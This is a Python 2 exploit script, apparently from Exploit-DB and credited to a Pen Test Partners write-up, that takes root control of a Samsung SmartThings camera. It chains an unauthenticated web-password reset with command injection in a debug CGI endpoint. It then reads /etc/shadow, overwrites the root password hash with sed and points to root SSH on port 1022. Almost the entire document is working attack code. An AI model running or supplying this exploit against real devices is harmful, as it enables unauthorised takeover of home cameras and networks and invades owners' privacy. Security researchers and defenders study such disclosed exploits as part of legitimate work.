# E-DB Note: source ~ https://www.pentestpartners.com/blog/samsungs-smart-camera-a-tale-of-iot-network-security/

import urllib, urllib2, crypt, time

# New password for web interface
web_password  	= 'admin'
# New password for root
root_password	= 'root'
# IP of the camera
ip 	      	= '192.168.12.61'

# These are all for the Smartthings bundled camera
realm = 'iPolis'
web_username = 'admin'
base_url = 'http://' + ip + '/cgi-bin/adv/debugcgi?msubmenu=shell&command=ls&command_arg=/...;'


# Take a command and use command injection to run it on the device
def run_command(command):
	# Convert a normal command into one using bash brace expansion
	# Can't send spaces to debugcgi as it doesn't unescape
	command_brace = '{' + ','.join(command.split(' ')) + '}'
	command_url = base_url + command_brace

	# HTTP digest auth for urllib2
	authhandler = urllib2.HTTPDigestAuthHandler()
	authhandler.add_password(realm, command_url, web_username, web_password)
	opener = urllib2.build_opener(authhandler)
	urllib2.install_opener(opener)

	return urllib2.urlopen(command_url)

# Step 1 - change the web password using the unauthed vuln found by zenofex
data = urllib.urlencode({ 'data' : 'NEW;' + web_password })
urllib2.urlopen('http://' + ip + '/classes/class_admin_privatekey.php', data)

# Need to sleep or the password isn't changed
time.sleep(1)

# Step 2 - find the current root password hash
shadow = run_command('cat /etc/shadow')

for line in shadow:
	if line.startswith('root:'):
		current_hash = line.split(':')[1]

# Crypt the new password
new_hash = crypt.crypt(root_password, '00')

# Step 3 - Use sed to search and replace the old for new hash in the passwd
# This is done because the command injection doesn't allow a lot of different URL encoded chars
run_command('sed -i -e s/' + current_hash + '/' + new_hash + '/g /etc/shadow')

# Step 4 - check that the password has changed
shadow = run_command('cat /etc/shadow')

for line in shadow:
	if line.startswith('root:'):
		current_hash = line.split(':')[1]

if current_hash <> new_hash:
	print 'Error! - password not changed'

# Step 5 - ssh to port 1022 with new root password!